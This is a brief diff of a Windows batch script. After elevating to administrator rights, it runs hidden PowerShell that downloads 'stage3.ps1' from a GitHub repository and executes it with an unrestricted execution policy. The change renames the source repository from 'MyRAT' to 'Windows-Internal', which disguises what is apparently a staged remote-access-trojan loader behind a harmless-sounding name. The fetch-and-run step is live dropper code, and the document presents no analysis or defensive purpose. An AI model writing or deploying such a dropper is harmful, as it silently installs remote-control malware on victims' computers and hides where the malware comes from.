@@ -24,5 +24,5 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/stage3.ps1' -OutFile 'stage3.ps1'"
+powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/refs/heads/main/stage3.ps1' -OutFile 'stage3.ps1'"
 powershell.exe -windowstyle hidden -ep unrestricted ./stage3.ps1
